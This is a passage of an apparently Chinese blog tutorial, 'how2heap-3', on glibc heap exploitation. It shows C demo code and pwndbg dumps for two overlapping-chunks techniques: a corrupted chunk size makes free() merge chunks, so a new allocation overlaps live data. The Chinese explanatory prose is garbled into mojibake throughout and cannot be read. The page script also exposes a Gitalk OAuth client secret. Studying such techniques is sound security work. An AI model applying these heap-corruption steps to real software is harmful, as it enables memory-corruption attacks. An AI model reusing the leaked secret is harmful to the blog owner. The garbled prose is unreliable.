class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨æˆ‘ä»¬ä¿®æ”¹ p4 çš„æ—¶å€™ï¼Œp3 ä¹Ÿä¼šè¢«ä¿®æ”¹ï¼›ä¿®æ”¹ p3 çš„æ—¶å€™ï¼Œp4 ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚</p>
<h2 id="overlanpping-chunks-2"><a href="#overlanpping-chunks-2" class="headerlink" title="overlanpping_chunks_2"></a>overlanpping_chunks_2</h2><p>Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk.</p>
<blockquote>
<p>åŒæ ·æ˜¯å †é‡å é—®é¢˜ï¼Œè¿™é‡Œæ˜¯åœ¨ free ä¹‹å‰ä¿®æ”¹ size å€¼ï¼Œä½¿ free é”™è¯¯åœ°ä¿®æ”¹äº†ä¸‹ä¸€ä¸ª chunk çš„ prev_size å€¼ï¼Œå¯¼è‡´ä¸­é—´çš„ chunk å¼ºè¡Œåˆå¹¶ã€‚</p>
</blockquote>
<h3 id="è§£é‡Š-2"><a href="#è§£é‡Š-2" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s start to allocate 5 chunks on the heap:&quot;</span>);</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n\nchunk p1 from %p to %p&quot;</span>, p1, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1+malloc_usable_size(p1));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p2 from %p to %p&quot;</span>, p2,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p2+malloc_usable_size(p2));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p&quot;</span>, p3,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p3+malloc_usable_size(p3));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p4 from %p to %p&quot;</span>, p4, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p4+malloc_usable_size(p4));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p5 from %p to %p\n&quot;</span>, p5,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1,<span class="string">&#x27;A&#x27;</span>,real_size_p1);</span><br><span class="line"><span class="built_in">memset</span>(p2,<span class="string">&#x27;B&#x27;</span>,real_size_p2);</span><br><span class="line"><span class="built_in">memset</span>(p3,<span class="string">&#x27;C&#x27;</span>,real_size_p3);</span><br><span class="line"><span class="built_in">memset</span>(p4,<span class="string">&#x27;D&#x27;</span>,real_size_p4);</span><br><span class="line"><span class="built_in">memset</span>(p5,<span class="string">&#x27;E&#x27;</span>,real_size_p5);</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆ malloc 5 å— chunkï¼Œ<strong>ç¬¬äº”å—</strong>çš„ä½œç”¨æ˜¯é˜²æ­¢ chunk4 free åè¢«æ”¾å…¥ top chunkã€‚è¿™é‡Œçš„è¦†ç›–ç›®æ ‡æ˜¯ chunk2 åˆ° chunk4ã€‚</p>
<p>é¦–å…ˆ free chunk 4</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s free the chunk p4.\nIn this case this isn&#x27;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(p4);</span><br></pre></td></tr></table></figure>

<p>ç”±äº chunk4 æ˜¯ free çŠ¶æ€ï¼Œp5 çš„ pre_size å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p5</span><br><span class="line">$1 &#x3D; (intptr_t *) 0x603fd0</span><br><span class="line">pwndbg&gt; x&#x2F;20gx p5-4</span><br><span class="line">0x603fb0:	0x4444444444444444	0x4444444444444444      &lt;-- chunk 5</span><br><span class="line">0x603fc0:	0x00000000000003f0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å‡è®¾ chunk1 æœ‰å †æº¢å‡º</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>; <span class="comment">//&lt;--- BUG HERE </span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ chunk2 çš„ sizeã€‚ä¿®æ”¹å‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p2</span><br><span class="line">$2 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x6033f0:	0x4141414141414141	0x00000000000003f1      &lt;-- size</span><br><span class="line">0x603400:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603410:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603420:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603430:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603440:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603450:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603460:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603470:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603480:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x6033f0:	0x4141414141414141	0x00000000000007e1      &lt;-- size</span><br><span class="line">0x603400:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603410:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603420:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603430:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603440:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603450:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603460:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603470:	0x4242424242424242	0x4242424242424242</span><br><span class="line">0x603480:	0x4242424242424242	0x4242424242424242</span><br></pre></td></tr></table></figure>

<p>chunk2 çš„ size å€¼è¢«ä¿®æ”¹ä¸º chunk2 å’Œ chunk3 çš„å¤§å°ä¹‹å’Œï¼Œæœ€åä¸€ä½æ˜¯æ ‡å¿—ä½ã€‚</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å½“æˆ‘ä»¬é‡Šæ”¾ chunk2 çš„æ—¶å€™ï¼Œmalloc æ ¹æ®è¢«ä¿®æ”¹çš„ size å€¼ï¼Œä¼šä»¥ä¸º chunk2 åŠ ä¸Š chunk3 çš„åŒºåŸŸéƒ½æ˜¯è¦é‡Šæ”¾çš„ï¼Œç„¶åå°±é”™è¯¯åœ°ä¿®æ”¹äº† chunk5 çš„ prev_sizeã€‚</p>
<p>ä¿®æ”¹å‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p5</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603fd0</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p5-2</span><br><span class="line">0x603fc0:	0x00000000000003f0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604050:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg p5-2</span><br><span class="line">0x603fc0:	0x0000000000000bd0	0x00000000000003f0      &lt;-- prev_size   &#x2F;   size</span><br><span class="line">0x603fd0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603fe0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x603ff0:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604000:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604010:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604020:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604030:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604040:	0x4545454545454545	0x4545454545454545</span><br><span class="line">0x604050:	0x4545454545454545	0x4545454545454545</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œåœ¨ free æ‰ chunk2 åï¼Œchunk2ã€chunk3 ä¸€èµ·è¢«é‡Šæ”¾ã€‚æ¥ç€å®ƒå‘ç°ç´§é‚»çš„ chunk4 ä¹Ÿæ˜¯ free çŠ¶æ€ï¼Œäºæ˜¯æŠŠå®ƒä»¬åˆå¹¶åˆ°äº†ä¸€èµ·ï¼Œç»„æˆäº†ä¸€ä¸ªå¤§çš„ free chunkï¼Œæ”¾å…¥äº† unsorted bin ä¸­ã€‚chunk5 çš„ prev_size ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6033f0 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x6033f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”³è¯·ä¸€å—æ–°çš„ chunk æ—¶ï¼Œmalloc å°±ä¼šä» unsorted bin ä¸­å–å‡ºä¸€éƒ¨åˆ†ï¼š</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p6 = <span class="built_in">malloc</span>(<span class="number">2000</span>);</span><br><span class="line">real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p6 from %p to %p&quot;</span>, p6,  (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p6+real_size_p6);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nchunk p3 from %p to %p\n&quot;</span>, p3, (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) p3+real_size_p3); </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿™é‡Œç”³è¯·äº† p6ï¼Œå®ƒä¼šå°† chunk2 å’Œ chunk3 éƒ½æ‹¿å‡ºæ¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p p6</span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; p p2</span><br><span class="line">$5 &#x3D; (intptr_t *) 0x603400</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603bd0 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x603bd0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20xg 0x603bd0</span><br><span class="line">0x603bd0:	0x4343434343434343	0x00000000000003f1</span><br><span class="line">0x603be0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</span><br><span class="line">0x603bf0:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c00:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c10:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c20:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c30:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c40:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c50:	0x4444444444444444	0x4444444444444444</span><br><span class="line">0x603c60:	0x4444444444444444	0x4444444444444444</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™æ—¶å€™ chunk6 å’Œ chunk 3 å¯ä»¥äº’ç›¸æ§åˆ¶å¯¹æ–¹çš„å†…å­˜æ•°æ®äº†ã€‚</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">QRZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://blog.qrzbing.cn/2019/07/09/how2heap-3/">http://blog.qrzbing.cn/2019/07/09/how2heap-3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://blog.qrzbing.cn">QRZ's Blog</a>ï¼</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/07/10/how2heap-4/"><i class="fa fa-chevron-left">  </i><span>how2heap-4</span></a></div><div class="next-post pull-right"><a href="/2019/07/08/how2heap-2/"><span>how2heap - 2</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: 'a28396a0fb37fdc22bce',
  clientSecret: 'e2e4c983cd284773491d067c6055febad1c23689',
  repo: '40m41h42t.github.io',
  owner: '40m41h42t',
  admin: '40m41h42t',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By QRZ</div><div class="framework-info"><span>é©±åŠ¨ - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>ä¸»é¢˜ - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>